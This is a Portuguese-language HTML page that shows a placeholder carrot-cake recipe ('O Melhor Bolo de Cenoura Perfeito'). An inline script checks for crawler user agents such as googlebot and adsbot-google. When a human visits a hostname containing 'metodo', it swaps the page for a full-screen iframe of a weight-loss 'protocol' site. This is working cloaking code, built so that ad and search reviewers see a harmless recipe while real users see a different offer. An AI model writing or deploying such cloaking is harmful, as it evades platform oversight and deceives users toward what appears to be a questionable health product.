<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Delícias da Vovó</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
        
        .container {
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: relative;
        }
        
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            /* Compensação matemática para escala de 0.85 (100 / 0.85 = 117.65) */
            width: 117.65% !important; 
            height: 117.65% !important;
            border: none;
            transform: scale(0.85); /* Diminui o site em 15% */
            transform-origin: 0 0;
        }
        .safe { padding: 20px; color: white; font-family: sans-serif; }
    </style>
</head>
<body>

<script>
    const isBot = /bot|googlebot|facebookexternalhit|adsbot-google|applebot/i.test(navigator.userAgent);
    const isMetodo = window.location.hostname.includes('metodo');

    if (isMetodo && !isBot) {
        document.body.innerHTML = '<div class="container"><iframe src="https://protocoloemagrecimentodivino.lovable.app/"></iframe></div>';
    }
</script>

<div class="safe">
    <h1>O Melhor Bolo de Cenoura Perfeito</h1>
    <p>Receita tradicional da família que todos amam...</p>
</div>

</body>
</html>
